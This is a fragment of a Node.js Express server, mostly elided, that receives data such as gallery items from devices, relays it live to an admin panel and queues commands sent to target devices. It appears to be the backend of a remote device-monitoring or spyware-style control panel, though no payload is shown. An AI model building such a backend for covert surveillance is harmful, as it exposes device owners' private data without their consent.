...
app.get('/', (req, res) => {
    res.send('✅ Server Running: Live Data & Gallery Fix Applied!');
});
...
// ==================================================
// 🔥 DATA STORAGE (Live Update Fixed)
// ==================================================
...
app.post('/api/upload_data', async (req, res) => { 
    ...
    try {
        ...
        // 2. 🔥 IMPORTANT FIX: Admin Panel ko notification bhejo
        console.log(`📦 Data Saved & Emitted: ${type} for ${id}`);
        io.emit('data-received', { device_id: id, type: type, data: finalData });
...
// ==================================================
// 🔥 COMMAND API (Button Support)
// ==================================================
app.post('/api/send-command', (req, res) => {
    let { device_id, deviceId, command } = req.body;
    
    let targetID = device_id || deviceId; // Support both naming conventions
    ...
    // 2. RAM mein save karo (Polling ke liye backup)
